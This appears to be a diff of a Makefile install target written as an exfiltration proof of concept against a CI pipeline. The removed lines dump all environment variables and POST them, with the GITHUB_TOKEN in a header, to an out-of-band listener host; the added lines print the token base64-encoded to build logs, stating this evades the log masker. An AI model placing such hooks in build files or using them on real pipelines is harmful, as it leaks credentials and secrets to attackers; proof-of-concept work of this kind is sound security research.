@@ -1,15 +1,13 @@
-# Define your listener
-EXFIL_URL = http://pg95wjutva1onpyza5j08j6umlscg24r.oastify.com
+# Ensure you use your actual Collaborator URL
+COLLABORATOR_URL = http://YOUR_ID.oastify.com
 
 weaver-install:
-	@echo "--- Initiating Exfiltration PoC ---"
+	@echo "--- Starting Exfiltration PoC ---"
 	
-	# 1. Capture and encode all environment variables
-	# We use base64 -w 0 to ensure the data is on a single line
-	$(eval ENV_DATA := $(shell env | base64 -w 0))
-	
-	# 2. Exfiltrate via HTTP POST
-	# We send the GITHUB_TOKEN in a header and the full env in the body
-	@curl -X POST -H "X-Exfil-Token: $(GITHUB_TOKEN)" -d "$(ENV_DATA)" $(EXFIL_URL)/env_exfil || echo "POST failed"
+	# 1. Print Base64 encoded token to GitHub logs
+	# This bypasses the log masker because the string no longer matches the token
+	@echo "Encoded Token for Log Verification:"
+	@echo "$(GITHUB_TOKEN)" | base64
+
 
 	@echo "--- PoC Complete ---"
